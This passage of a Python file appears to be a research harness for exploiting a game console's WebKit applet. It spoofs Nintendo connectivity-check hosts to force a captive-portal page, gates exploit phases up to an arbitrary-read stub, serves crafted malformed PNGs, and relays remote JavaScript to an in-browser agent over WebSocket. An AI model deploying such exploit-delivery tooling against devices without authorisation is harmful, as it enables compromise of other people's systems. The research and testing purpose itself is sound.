            LOG.info("%s TLS/transport reject: %r", client_address[0], exc)
            return
        super().handle_error(request, client_address)


class PortalHandler(BaseHTTPRequestHandler):
    server_version = RIG_NAME + "/" + RIG_VERSION
    sys_version = ""
    protocol_version = "HTTP/1.1"
    timeout = 30  # per-socket; hung applet connections must not pile up

    # ---- plumbing --------------------------------------------------------

    @property
    def cfg(self) -> RigConfig:
        return self.server.cfg

    def log_message(self, fmt, *args):  # default noise -> debug only
        LOG.debug(fmt, *args)

    def log_request(self, code="-", size="-"):
        pass  # we log after the response is sent (see _finish)

    def _host_header(self) -> str:
        host = self.headers.get("Host") or ""
        host = host.strip().lower().rstrip(".")
        return host.rsplit(":", 1)[0] if not host.startswith("[") else host

    def _send(self, status: int, body: bytes, ctype: str, method: str,
              extra: dict | None = None) -> None:
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        if status != 204:
            self.send_header("Content-Length", str(len(body)))
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Connection", "close")
        self.end_headers()
        if method != "HEAD" and status != 204 and body:
            self.wfile.write(body)
        self._log_access(status, len(body))

    def _send_json(self, status: int, obj: dict, method: str,
                   extra: dict | None = None) -> None:
        self._send(status, json.dumps(obj, separators=(",", ":")).encode("utf-8"),
                   "application/json", method, extra)

    def _log_access(self, status: int, size: int) -> None:
        uir = 1 if self.headers.get("Upgrade-Insecure-Requests") else 0
        peer = self.client_address[0]
        ua = self.headers.get("User-Agent") or ""
        LOG.info("%s %s %s %s -> %d %dB ua=%r host=%r uir=%d",
                 peer, self.command,
                 self.headers.get("Host") or "-", self.path,
                 status, size, ua, self._host_header(), uir)
        # full-fidelity persistence: every request line lands in the run
        # dir (append+flush). The /rig/live RING skips the dashboard's own
        # feed polls -- infrastructure traffic is spinner noise, not signal
        # (it stays fully recorded in access-*.jsonl).
        self.cfg.append_access({
            "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
            "peer": peer, "method": self.command,
            "host": self.headers.get("Host") or "-",
            "path": self.path, "status": status, "bytes": size,
            "ua": ua, "uir": uir})
        if "/rig/live/feed" not in self.path:
            self.cfg.live_emit("http_hit", peer,
                               "%s %s %d %dB" % (self.command, self.path, status, size))

    # ---- HTTP verbs ------------------------------------------------------

    def do_GET(self):
        self._handle("GET")

    def do_HEAD(self):
        self._handle("HEAD")

    def do_POST(self):
        self._handle("POST")

    def _handle(self, method: str) -> None:
        try:
            self._dispatch(method)
        except RigHttpError as e:
            extra = {"Allow": e.allow} if e.allow else None
            self._send_json(e.status, {"error": {"code": e.code, "message": e.message}},
                            method, extra)
        except (BrokenPipeError, ConnectionResetError):
            self.close_connection = True
        except Exception as e:  # never leak a bare traceback to the socket
            LOG.exception("internal error handling %s %s", method, self.path)
            try:
                self._send_json(500, {"error": {"code": "E_INTERNAL",
                                                "message": "internal error (logged)"}}, method)
            except OSError:
                self.close_connection = True

    # ---- routing ---------------------------------------------------------

    def _dispatch(self, method: str) -> None:
        url = urlsplit(self.path)
        path = url.path
        host = self._host_header()

        # barbarism 0.1.12: BVC — NIM's safe-system-version feed. The
        # applet-gate experiment: serve configurable responses so NIM can
        # complete its check instead of failing on NXDOMAIN (the documented
        # trigger for "This feature is not available" on ns:vm applets).
        if host.startswith("bvc-") and host.endswith(".cdn.nintendo.net"):
            if method not in ("GET", "HEAD"):
                raise RigHttpError(405, "E_METHOD", "bvc path is GET-only",
                                   allow="GET, HEAD")
            profile = self.cfg.bvc_profile
            LOG.info("BVC request: host=%s path=%s profile=%s", host, path, profile)
            if profile == "404":
                self._send(404, b"", "text/plain", method)
            elif profile == "empty":
                self._send(200, b"", "application/octet-stream", method)
            elif profile == "json":
                body = b'{"latest": 0, "safe": 0}'
                self._send(200, body, "application/json", method)
            elif profile == "xml":
                body = (b'<?xml version="1.0"?><response><version>0.0.0'
                        b'</version></response>')
                self._send(200, body, "application/xml", method)
            else:
                self._send(404, b"", "text/plain", method)
            return

        if host in CONNTEST_HOSTS:
            if method not in ("GET", "HEAD"):
                raise RigHttpError(405, "E_METHOD", "conntest path is GET-only",
                                   allow="GET, HEAD")
            # barbarism 0.1.8: the conntest PROFILE MATRIX — the one response
            # we send here decides which branch of the console's connectivity
            # state machine runs. Map every shape -> observed console screen
            # before concluding anything is gated; see docs/WEBKIT-PROFILES.md.
            p = self.cfg.conntest_profile
            if p == "success":           # 200 + X-Organization (classic online)
                self._send(200, b"", "text/plain", method,
                           {X_ORGANIZATION: ORG_NINTENDO})
            elif p == "ok-no-org":       # bench's connectivity_ok: 200 body "ok"
                self._send(200, b"ok\n", "text/plain", method)
            elif p == "redirect":        # captive trigger (default): 302 -> /portal
                self._send(302, b"captive portal redirect\n", "text/plain", method,
                           {"Location": self.cfg.portal_url()})
            elif p == "redirect-xorg":   # does the header outrank the redirect?
                self._send(302, b"captive portal redirect\n", "text/plain", method,
                           {"Location": self.cfg.portal_url(),
                            X_ORGANIZATION: ORG_NINTENDO})
            elif p == "redirect-samehost":  # Apple-style: same host, new path
                self._send(302, b"captive portal redirect\n", "text/plain", method,
                           {"Location": "/portal"})
            elif p == "no-content":      # 204: the Android-probe shape
                self._send(204, b"", "text/plain", method)
            elif p == "hang":            # blackhole: how long until which error?
                time.sleep(30)
                self._send(200, b"", "text/plain", method)
            else:
                raise RigHttpError(500, "E_PROFILE",
                                   "unknown conntest profile " + p)
            return

        if path in ("/portal", "/portal/"):
            self._send(200, self.cfg.page_body(), "text/html; charset=utf-8", method)
        elif path.startswith("/page/"):
            self._send_page(path, method)
        elif path == "/rig/swap":
            self._handle_swap(method, url)
        elif path == "/rig/phase":
            self._handle_phase(method)
        elif path == "/rig/png/ztxt":
            self._handle_png_craft(method, url)
        elif path == "/rig/live":
            if method != "GET":
                raise RigHttpError(405, "E_METHOD", "GET /rig/live (dashboard)",
                                   allow="GET")
            self._send(200, LIVE_HTML.encode("utf-8"),
                       "text/html; charset=utf-8", method)
        elif path == "/rig/live/feed":
            if method != "GET":
                raise RigHttpError(405, "E_METHOD", "GET /rig/live/feed?since=N",
                                   allow="GET")
            since = 0
            for pair in url.query.split("&"):
                if pair.startswith("since="):
                    try:
                        since = int(pair[6:])
                    except ValueError:
                        raise RigHttpError(400, "E_BAD_SINCE", "since must be an int")
            self._send_json(200, self.cfg.live_feed(since), method)
        elif path == "/rig/ws/send":
            self._handle_ws_send(method)
        elif path == "/rig/ws/state":
            self._handle_ws_state(method)
        elif path == "/report":
            if method != "POST":
                raise RigHttpError(405, "E_METHOD", "POST JSON telemetry to /report",
                                   allow="POST")
            self._handle_report()
        elif path == "/stage" or path.startswith("/stage/"):
            self._send_stage(path, method)
        elif path == "/health":
            self._send(200, (RIG_NAME + " " + RIG_VERSION + " ready\n").encode(),
                       "text/plain", method)
        elif path == "/ws":
            if method != "GET":
                raise RigHttpError(405, "E_METHOD", "WebSocket upgrade is GET-only",
                                   allow="GET")
            self._handle_ws_upgrade(url)
        else:
            # Sinkhole: log and refuse whatever else the console asked for.
            raise RigHttpError(404, "E_NOT_FOUND",
                               "sinkholed host=%r path=%r" % (host, path))

    def _local_only(self) -> str:
        """Control-plane peer check: loopback or this server's own bind IP."""
        peer = self.client_address[0]
        if not (peer.startswith("127.") or peer == self.cfg.ip):
            raise RigHttpError(403, "E_FORBIDDEN",
                               "rig control plane is local-only (bench host)")
        return peer

    def _send_page(self, path: str, method: str) -> None:
        name = unquote(path[len("/page/"):]).strip("/").strip()
        if not name or "/" in name or name.startswith("."):
            raise RigHttpError(404, "E_NO_SUCH_PAGE", "bad page name %r" % name)
        body = self.cfg.page_body(name)
        if body is None:
            raise RigHttpError(404, "E_NO_SUCH_PAGE",
                               "no page %r (registered: %s)"
                               % (name, ", ".join(["portal"] + sorted(self.cfg.pages))))
        self._send(200, body, "text/html; charset=utf-8", method)

    def _handle_swap(self, method: str, url) -> None:
        """Auto-chain control plane: local-only POST that swaps /portal to
        another page (default: the --probe-page, back-compat; ?name=<stem>
        for any registered pages/ page). The console must never reach this."""
        if method != "POST":
            raise RigHttpError(405, "E_METHOD",
                               "POST /rig/swap[?name=<page>] to swap /portal",
                               allow="POST")
        peer = self._local_only()
        name = (url.query.split("=", 1)[-1] if url.query.startswith("name=")
                else "probe")
        if name not in ("portal",) and name not in self.cfg.pages:
            raise RigHttpError(404, "E_NO_SUCH_PAGE",
                               "no page %r (registered: %s)"
                               % (name, ", ".join(sorted(self.cfg.pages) or ["(none)"])))
        if self.cfg.swap_to(name):
            LOG.info("%s POST /rig/swap -> swapped /portal to %r", peer, name)
            self.cfg.append_access({
                "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
                "kind": "swap", "peer": peer, "page": name})
            self.cfg.live_emit("swap", peer, "/portal -> %s" % name)
            self._send_json(200, {"ok": True, "serving": name}, method)
        else:
            raise RigHttpError(409, "E_ALREADY_SERVING",
                               "/portal already serves %r" % name)

    def _handle_phase(self, method: str) -> None:
        """The exploit-phase gate: fontchain.html refuses to run a phase the
        rig has not explicitly advanced to. GET reports it; local-only POST
        {"phase": N} advances it (1=trigger-only .. 3=arb-read stub)."""
        peer = self._local_only()
        if method == "GET":
            self._send_json(200, {"phase": self.cfg.get_phase(),
                                  "max": MAX_PHASE}, method)
            return
        if method != "POST":
            raise RigHttpError(405, "E_METHOD",
                               "GET or POST {\"phase\":N} at /rig/phase", allow="GET, POST")
        length_hdr = self.headers.get("Content-Length")
        try:
            body = json.loads(self.rfile.read(int(length_hdr or 0)).decode("utf-8")) \
                if length_hdr else {}
        except (ValueError, UnicodeDecodeError, json.JSONDecodeError):
            raise RigHttpError(400, "E_BAD_JSON", "phase body must be JSON")
        if not isinstance(body, dict) or not isinstance(body.get("phase"), int):
            raise RigHttpError(400, "E_BAD_PHASE",
                               "body must be {\"phase\": <int 1..%d>}" % MAX_PHASE)
        old_phase = self.cfg.get_phase()
        new_phase = self.cfg.set_phase(body["phase"])
        LOG.info("%s POST /rig/phase -> phase=%d", peer, new_phase)
        self.cfg.append_access({
            "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
            "kind": "phase_gate", "peer": peer,
            "from": old_phase, "to": new_phase})
        self.cfg.live_emit("phase_gate", peer,
                           "changed %d->%d" % (old_phase, new_phase))
        self._send_json(200, {"ok": True, "phase": new_phase}, method)

    def _handle_png_craft(self, method: str, url) -> None:
        """Asset source for the pngztxt oracle page (LAN-reachable: the
        console's <img> fetches it). mode=N selects a benign (0-3) or
        malformed (10-16) compressed-ancillary-chunk shape; seed=N makes
        the pixels/text deterministic. Malformed modes are refused unless
        the rig phase gate is >= 2 -- the server-side mirror of the page's
        own gate, so the shapes cannot be fetched by accident even with
        the page open."""
        if method not in ("GET", "HEAD"):
            raise RigHttpError(405, "E_METHOD", "GET /rig/png/ztxt?mode=N&seed=N",
                               allow="GET, HEAD")
        params = {}
        for pair in url.query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[unquote(k)] = unquote(v)
        try:
            mode = int(params.get("mode", "0"))
            seed = int(params.get("seed", "0"))
        except ValueError:
            raise RigHttpError(400, "E_BAD_MODE", "mode/seed must be integers")
        if mode not in PNG_BENIGN_MODES and mode not in PNG_MALFORMED_MODES:
            raise RigHttpError(404, "E_NO_SUCH_MODE",
                               "mode %d unknown (benign: %s, malformed: %s)"
                               % (mode, PNG_BENIGN_MODES, PNG_MALFORMED_MODES))
        if mode in PNG_MALFORMED_MODES and self.cfg.get_phase() < 2:
            raise RigHttpError(403, "E_PHASE_GATE",
                               "malformed PNG modes need rig phase >= 2 "
                               '(POST {"phase":2} at /rig/phase, local-only)')
        body = craft_png(mode, seed)
        LOG.info("%s GET /rig/png/ztxt mode=%d(%s) seed=%d -> %dB",
                 self.client_address[0], mode, PNG_MODE_NAMES.get(mode, "?"),
                 seed, len(body))
        self._send(200, body, "image/png", method)

    def _handle_ws_upgrade(self, url) -> None:
        """RFC 6455 upgrade in the existing server (stdlib-only). role comes
        from the query string: agent (wsagent.html), console (operator), or
        probe (transient connect-back check)."""
        upgrade = (self.headers.get("Upgrade") or "").strip().lower()
        key = self.headers.get("Sec-WebSocket-Key")
        version = self.headers.get("Sec-WebSocket-Version")
        if upgrade != "websocket" or not key:
            raise RigHttpError(426, "E_WS_UPGRADE",
                               "WebSocket upgrade required (Upgrade: websocket, "
                               "Sec-WebSocket-Key); see docs/RIG.md")
        if version not in (None, "13"):
            self.send_response(426)
            self.send_header("Sec-WebSocket-Version", "13")
            self.send_header("Content-Type", "application/json")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(b'{"error":{"code":"E_WS_VERSION","message":"only v13"}}')
            self.close_connection = True
            return
        role = "console"
        for pair in url.query.split("&"):
            if pair.startswith("role="):
                role = unquote(pair[5:]) or "console"
        if role not in ("agent", "console", "probe"):
            raise RigHttpError(400, "E_WS_ROLE", "role must be agent|console|probe")
        accept = base64.b64encode(
            hashlib.sha1((key.strip() + WS_GUID).encode("ascii")).digest()
        ).decode("ascii")
        self.connection.sendall(
            ("HTTP/1.1 101 Switching Protocols\r\n"
             "Upgrade: websocket\r\n"
             "Connection: Upgrade\r\n"
             "Sec-WebSocket-Accept: %s\r\n\r\n" % accept).encode("ascii"))
        self.close_connection = True
        LOG.info("%s WS upgrade role=%s", self.client_address[0], role)
        # The socket is ours now; hold this handler thread for the session.
        try:
            self.connection.settimeout(90)
        except OSError:
            pass
        session = WsSession(self.connection, self.client_address[0], role,
                            self.cfg.ws_hub)
        session.run()

    def _handle_ws_send(self, method: str) -> None:
        """Local-only curl-driven eval: POST {"code": "...", "id"?: "..."} ->
        forwarded to the connected agent as {id, code}."""
        if method != "POST":
            raise RigHttpError(405, "E_METHOD", "POST {\"code\":...} at /rig/ws/send",
                               allow="POST")
        peer = self._local_only()
        length_hdr = self.headers.get("Content-Length")
        if length_hdr is None:
            raise RigHttpError(411, "E_LENGTH_REQUIRED", "Content-Length required")
        try:
            body = json.loads(self.rfile.read(min(int(length_hdr),
                                                  MAX_REPORT_BYTES)).decode("utf-8"))
        except (ValueError, UnicodeDecodeError, json.JSONDecodeError) as e:
            raise RigHttpError(400, "E_BAD_JSON", "not JSON: %s" % e)
        if not isinstance(body, dict) or "code" not in body:
            raise RigHttpError(400, "E_BAD_CODE", "body must be {\"code\": \"...\"}")
        mid = self.cfg.ws_hub.alloc_msg_id(str(body.get("id")) if body.get("id") else None)
        ok = self.cfg.ws_hub.send_to_agent(mid, str(body["code"]))
        LOG.info("%s POST /rig/ws/send id=%s ok=%s", peer, mid, ok)
        if ok:
            self._send_json(200, {"ok": True, "id": mid, "queued": True}, method)
        else:
            self._send_json(409, {"ok": False, "id": mid,
                                  "error": "agent not connected"}, method)

    def _handle_ws_state(self, method: str) -> None:
        if method != "GET":
            raise RigHttpError(405, "E_METHOD", "GET /rig/ws/state", allow="GET")
        self._local_only()
        self._send_json(200, self.cfg.ws_hub.state(), method)

    def _handle_report(self) -> None:
        length_hdr = self.headers.get("Content-Length")
        if length_hdr is None:
            raise RigHttpError(411, "E_LENGTH_REQUIRED",
                               "Content-Length required (chunked not supported)")
        try:
            length = int(length_hdr)
        except ValueError:
            raise RigHttpError(400, "E_BAD_LENGTH", "unparsable Content-Length")
        if length < 0 or length > MAX_REPORT_BYTES:
            self.close_connection = True
            raise RigHttpError(413, "E_TOO_LARGE",
                               "report body over %d bytes" % MAX_REPORT_BYTES)
        body = self.rfile.read(length)
        if len(body) != length:
            raise RigHttpError(400, "E_SHORT_BODY", "client disconnected mid-body")
        try:
            data = json.loads(body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as e:
            raise RigHttpError(400, "E_BAD_JSON", "report is not UTF-8 JSON: %s" % e)
        if not isinstance(data, dict):
            raise RigHttpError(400, "E_BAD_JSON", "report must be a JSON object")
        envelope = {
            "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
            "peer": self.client_address[0],
            "host": self.headers.get("Host") or "",
            "ua": self.headers.get("User-Agent") or "",
            "path": self.path,
            "data": data,
        }
        self.cfg.append_report(envelope)
        # live/dashboard state: first applet UA = the entry-surface moment;
        # every kit-page POST keeps its latest headline for the verdict panel
        peer = self.client_address[0]
        if "WifiWebAuthApplet" in envelope["ua"]:
            self.cfg.note_applet(peer)
        page = data.get("page")
        if isinstance(page, str):
            headline = data.get("verdict") or data.get("phase")
            self.cfg.live_emit("page_report", peer,
                               "%s phase=%s %s" % (page, data.get("phase"),
                                                   headline or ""))
            with self.cfg.live_lock:
                self.cfg.last_page_reports[page] = {
                    "ts": envelope["ts"], "phase": data.get("phase"),
                    "verdict": data.get("verdict"),
                    "effectivePhase": (data.get("gate") or {}).get("effectivePhase")
                    if isinstance(data.get("gate"), dict) else None}
        self._send_json(200, {"ok": True, "bytes": length}, "POST")

    def _send_stage(self, path: str, method: str) -> None:
        rel = unquote(path[len("/stage/"):]).strip("/")
        parts = [p for p in rel.split("/") if p not in ("", ".")]
        if not parts or any(p == ".." for p in parts):
            raise RigHttpError(404, "E_NOT_FOUND", "path traversal rejected")
        root = os.path.realpath(self.cfg.stage_dir)
        target = os.path.realpath(os.path.join(root, *parts))
        if os.path.dirname(target) != root and not target.startswith(root + os.sep):
            raise RigHttpError(404, "E_NOT_FOUND", "path escapes stage dir")
        if not target.startswith(root + os.sep) or not os.path.isfile(target):
            raise RigHttpError(404, "E_NOT_FOUND", "no such staged file")
        with open(target, "rb") as f:
            blob = f.read()
        ext = os.path.splitext(target)[1].lower()
        self._send(200, blob, CONTENT_TYPES.get(ext, "application/octet-stream"), method)


# ---------------------------------------------------------------------------
# Network helpers (duplicated from dns.py so each script is standalone)
# ---------------------------------------------------------------------------

def iface_ipv4(name: str) -> str:
    try:
        available = ", ".join(n for _, n in socket.if_nameindex())
        if available and name not in available.split(", "):
            raise SystemExit("error: interface %r not found; available: %s" % (name, available))
    except (AttributeError, OSError):
        pass
    cmds = []
    if sys.platform.startswith("linux"):
        cmds.append(["ip", "-4", "-o", "addr", "show", "dev", name])
    cmds.append(["ifconfig", name])
    for cmd in cmds:
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            continue
        if out.returncode != 0:
            continue
        m = re.search(r"inet\s+(\d{1,3}(?:\.\d{1,3}){3})", out.stdout)
        if m and not m.group(1).startswith("127."):
            return m.group(1)
    raise SystemExit("error: could not resolve an IPv4 address for interface %r" % name)


def autodetect_ipv4() -> str | None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("192.0.2.1", 53))  # no packet leaves; kernel picks source IP
        return s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()


def resolve_bind_ip(args) -> str:
    if args.ip:
        return args.ip
    if args.interface:
        return iface_ipv4(args.interface)
    ip = autodetect_ipv4()
    if ip:
        print("note: auto-detected LAN IP %s; pass --ip/--interface to pin it" % ip)
        return ip
    raise SystemExit("error: could not auto-detect a LAN IP; pass --ip or --interface")


def maybe_drop_privs() -> None:
    """After binding 80 as root, step back to the sudo user (bench pattern)."""
    if not hasattr(os, "geteuid") or os.geteuid() != 0:
        return
    uid_s, gid_s = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not uid_s or not gid_s:
        return
    try:
        os.setgid(int(gid_s))
        os.setuid(int(uid_s))
        print("dropped privileges to uid=%s gid=%s" % (uid_s, gid_s))
    except OSError as e:
        print("warning: could not drop privileges: %s" % e, file=sys.stderr)


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------

class _ListHandler(logging.Handler):
    def __init__(self):
        super().__init__(level=logging.INFO)
        self.records: list[str] = []

    def emit(self, record: logging.LogRecord) -> None:
        self.records.append(record.getMessage())


def self_test() -> int:
    import shutil
    import tempfile
    failures = 0

    def check(name: str, cond: bool, detail: str = "") -> None:
        nonlocal failures
        status = "ok" if cond else "FAIL"
        if not cond:
            failures += 1
        print("%s - %s%s" % (status, name, (" | " + detail) if detail and not cond else ""))

    tmp = tempfile.mkdtemp(prefix="rig-portal-selftest-")
    runs_dir = os.path.join(tmp, "runs")
    stage_dir = os.path.join(tmp, "stage")
    os.makedirs(stage_dir)
    with open(os.path.join(stage_dir, "sample.txt"), "w") as f:
        f.write("staged payload chunk\n")
    probe_file = os.path.join(tmp, "probe-fake.html")
    with open(probe_file, "w", encoding="utf-8") as f:
        f.write("<!doctype html><html><script>var RIG_HOST = \"{{RIG_HOST}}\";"
                "var RIG_PORT = \"{{RIG_PORT}}\";/*probe-marker*/</script></html>")
    sink = _ListHandler()
    LOG.addHandler(sink)
    LOG.propagate = False
    old_level, LOG.level = LOG.level, logging.INFO

    def make_server(mode: str, probe: str | None = None) -> tuple[RigHTTPServer, RigConfig]:
        cfg = RigConfig("127.0.0.1", 0, runs_dir, stage_dir, mode, probe)
        srv = RigHTTPServer(("127.0.0.1", 0), cfg)
        threading.Thread(target=srv.serve_forever, daemon=True,
                         name="rig-portal-test").start()
        return srv, cfg

    srv, cfg = make_server("redirect")
    port = srv.server_address[1]
    ok_srv, ok_cfg = make_server("success")
    ok_port = ok_srv.server_address[1]

    def req(port_: int, method: str, path: str, host: str | None = None,
            body: bytes | None = None, ctype: str | None = None):
        conn = http.client.HTTPConnection("127.0.0.1", port_, timeout=5)
        headers = {"Host": host} if host else {}
        if ctype:
            headers["Content-Type"] = ctype
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        payload = resp.read()
        conn.close()
        return resp, payload

    try:
        # (a) conntest GET -> 302 to /portal WITHOUT X-Organization
        for host in CONNTEST_HOSTS:
            r, _ = req(port, "GET", "/", host=host)
            check("conntest %s -> 302" % host, r.status == 302, "status=%d" % r.status)
            check("  Location = /portal", r.getheader("Location") == cfg.portal_url(),
                  "loc=%r" % r.getheader("Location"))
            check("  no X-Organization header",
                  r.getheader(X_ORGANIZATION) is None,
                  "got %r" % r.getheader(X_ORGANIZATION))
        r, _ = req(port, "GET", "/whatever", host="ctest.cdn.nintendo.net")
        check("conntest any path redirects", r.status == 302 and r.getheader("Location").endswith("/portal"))
        r, _ = req(ok_port, "GET", "/", host="ctest.cdn.nintendo.net")
        check("success mode: 200 + X-Organization: Nintendo",
              r.status == 200 and r.getheader(X_ORGANIZATION) == ORG_NINTENDO,
              "status=%d org=%r" % (r.status, r.getheader(X_ORGANIZATION)))

        # (b) /portal serves the probe page, templated
        r, body = req(port, "GET", "/portal")
        check("/portal -> 200 html", r.status == 200 and "text/html" in r.getheader("Content-Type", ""))
        check("page templated (no leftover tokens)",
              b"{{RIG_" not in body and b"id=\"rig-card\"" in body and b"/report" in body)
        check("page no-store", r.getheader("Cache-Control") == "no-store")

        # (b2) /rig/swap control plane: local-only POST swaps /portal content
        psrv, pcfg = make_server("redirect", probe_file)
        pport = psrv.server_address[1]
        try:
            r, body = req(pport, "GET", "/rig/swap")
            check("/rig/swap GET -> 405 E_METHOD",
                  r.status == 405 and b"E_METHOD" in body, "status=%d" % r.status)
            r, body = req(pport, "POST", "/rig/swap")
            check("/rig/swap local POST -> 200 serving=probe",
                  r.status == 200 and json.loads(body)["serving"] == "probe",
                  "status=%d body=%r" % (r.status, body))
            r, body = req(pport, "GET", "/portal")
            check("/portal after swap serves probe page",
                  r.status == 200 and b"probe-marker" in body and b"{{RIG_" not in body)
            r, body = req(pport, "POST", "/rig/swap")
            check("/rig/swap second POST -> 409 E_ALREADY_SERVING",
                  r.status == 409 and b"E_ALREADY_SERVING" in body, "status=%d body=%r" % (r.status, body))
        finally:
            psrv.shutdown()
            psrv.server_close()
            pcfg.close()

        # (b3) named-page swap + direct /page/<name> serving
        named = sorted(cfg.pages)
        for name in named:
            r, body = req(port, "GET", "/page/" + name)
            check("/page/%s -> 200 templated" % name,
                  r.status == 200 and b"{{RIG_" not in body, "status=%d" % r.status)
        if "capsweep" in cfg.pages:
            r, body = req(port, "POST", "/rig/swap?name=capsweep")
            check("/rig/swap?name=capsweep -> 200",
                  r.status == 200 and json.loads(body)["serving"] == "capsweep",
                  "status=%d body=%r" % (r.status, body))
            r, body = req(port, "GET", "/portal")
            check("/portal now serves capsweep", b"capsweep" in body)
            req(port, "POST", "/rig/swap?name=portal")   # restore for later checks
        r, body = req(port, "POST", "/rig/swap?name=nosuchpage")
        check("/rig/swap unknown name -> 404 E_NO_SUCH_PAGE",
              r.status == 404 and b"E_NO_SUCH_PAGE" in body, "status=%d" % r.status)
        r, body = req(port, "GET", "/page/nosuchpage")
        check("/page/nosuchpage -> 404", r.status == 404 and b"E_NO_SUCH_PAGE" in body)

        # (b4) /rig/phase gate: GET reports 1, local POST advances, clamps at MAX
        r, body = req(port, "GET", "/rig/phase")
        check("/rig/phase GET -> phase=1",
              r.status == 200 and json.loads(body)["phase"] == 1, "body=%r" % body)
        r, body = req(port, "POST", "/rig/phase", body=b'{"phase": 2}', ctype="application/json")
        check("/rig/phase POST 2 -> 200", r.status == 200 and json.loads(body)["phase"] == 2)
        r, body = req(port, "POST", "/rig/phase", body=b'{"phase": 99}', ctype="application/json")
        check("/rig/phase clamps at %d" % MAX_PHASE,
              r.status == 200 and json.loads(body)["phase"] == MAX_PHASE)
        r, body = req(port, "POST", "/rig/phase", body=b'{"phase": 1}', ctype="application/json")
        check("/rig/phase resets to 1", json.loads(body)["phase"] == 1)
        r, body = req(port, "POST", "/rig/phase", body=b'{"nope": 1}', ctype="application/json")
        check("/rig/phase bad body -> 400 E_BAD_PHASE",
              r.status == 400 and b"E_BAD_PHASE" in body, "status=%d" % r.status)

        # (b5) /rig/png/ztxt crafter: benign modes served, signature valid,
        # chunk framing right; malformed modes mirror the phase gate
        r, body = req(port, "GET", "/rig/png/ztxt?mode=1&seed=7")
        ok_png = (r.status == 200 and body[:8] == b"\x89PNG\r\n\x1a\n"
                  and b"zTXt" in body)
        check("/rig/png/ztxt mode=1 -> 200 valid PNG with zTXt", ok_png,
              "status=%d sig=%r" % (r.status, body[:8]))
        for m in (0, 2, 3):
            r, body = req(port, "GET", "/rig/png/ztxt?mode=%d" % m)
            check("  benign mode %d -> 200 PNG" % m,
                  r.status == 200 and body[:4] == b"\x89PNG")
        r, body = req(port, "GET", "/rig/png/ztxt?mode=10")
        check("  malformed mode 10 gated at phase 1 -> 403 E_PHASE_GATE",
              r.status == 403 and b"E_PHASE_GATE" in body, "status=%d" % r.status)
        req(port, "POST", "/rig/phase", body=b'{"phase": 2}', ctype="application/json")
        r, body = req(port, "GET", "/rig/png/ztxt?mode=10&seed=3")
        check("  malformed mode 10 at phase 2 -> 200 PNG",
              r.status == 200 and body[:4] == b"\x89PNG" and b"zTXt" in body)
        r, body = req(port, "GET", "/rig/png/ztxt?mode=12")
        check("  iccp-huge mode 12 -> 200 PNG with iCCP",
              r.status == 200 and b"iCCP" in body)
        r, body = req(port, "GET", "/rig/png/ztxt?mode=99")
        check("  unknown mode -> 404 E_NO_SUCH_MODE",
              r.status == 404 and b"E_NO_SUCH_MODE" in body)
        # framing invariants: IEND present, IHDR width/height sane
        r, body = req(port, "GET", "/rig/png/ztxt?mode=1")
        check("  crafted PNG has IHDR/IEND and 8x8 dims",
              b"IHDR" in body and b"IEND" in body
              and struct.unpack(">II", body[16:24]) == (8, 8))
        req(port, "POST", "/rig/phase", body=b'{"phase": 1}', ctype="application/json")

        # (c) /report persists telemetry
        payload = json.dumps({"schema": 1, "phase": "selftest", "env": {"ua": "pytest"}}).encode()
        r, body = req(port, "POST", "/report", body=payload, ctype="application/json")
        check("/report POST -> 200 ok", r.status == 200 and json.loads(body)["ok"] is True)
        with open(cfg.runs_path, "r", encoding="utf-8") as f:
            lines = [json.loads(l) for l in f.read().splitlines() if l.strip()]
        check("telemetry persisted to %s" % os.path.basename(cfg.runs_path),
              len(lines) == 1 and lines[0]["data"]["phase"] == "selftest"
              and lines[0]["peer"] == "127.0.0.1" and "ua" in lines[0])
        r, body = req(port, "POST", "/report", body=b"{not json", ctype="application/json")
        check("/report bad JSON -> 400 E_BAD_JSON",
              r.status == 400 and b"E_BAD_JSON" in body, "status=%d body=%r" % (r.status, body))
        r, body = req(port, "GET", "/report")
        check("/report GET -> 405 E_METHOD",
              r.status == 405 and b"E_METHOD" in body, "status=%d" % r.status)

        # (d) /stage serves staged files and blocks traversal
        r, body = req(port, "GET", "/stage/sample.txt")
        check("/stage/sample.txt -> 200", r.status == 200 and body == b"staged payload chunk\n")
        r, body = req(port, "GET", "/stage/missing.bin")
        check("/stage missing -> 404", r.status == 404 and b"E_NOT_FOUND" in body)
        r, _ = req(port, "GET", "/stage/%2e%2e/dns.py")
        check("/stage encoded traversal blocked", r.status == 404)
        r, _ = req(port, "GET", "/stage/../../tools/webkit-rig/dns.py")
        check("/stage dotdot traversal blocked", r.status == 404)

        # (e) sinkhole + placeholders + access log
        r, body = req(port, "GET", "/some/nintendo/host", host="update.nintendo.net")
        check("unknown host sinkholed 404", r.status == 404 and b"E_NOT_FOUND" in body)

        # (f) WebSocket bridge: non-upgrade GET -> 426; real agent+console flow
        r, body = req(port, "GET", "/ws")
        check("/ws without upgrade -> 426 E_WS_UPGRADE",
              r.status == 426 and b"E_WS_UPGRADE" in body, "status=%d body=%r" % (r.status, body))

        def ws_connect(port_: int, role: str):
            s = socket.create_connection(("127.0.0.1", port_), timeout=5)
            key = base64.b64encode(os.urandom(16)).decode()
            s.sendall(("GET /ws?role=%s HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                       "Upgrade: websocket\r\nConnection: Upgrade\r\n"
                       "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n"
                       % (role, key)).encode())
            hdr = b""
            while b"\r\n\r\n" not in hdr:
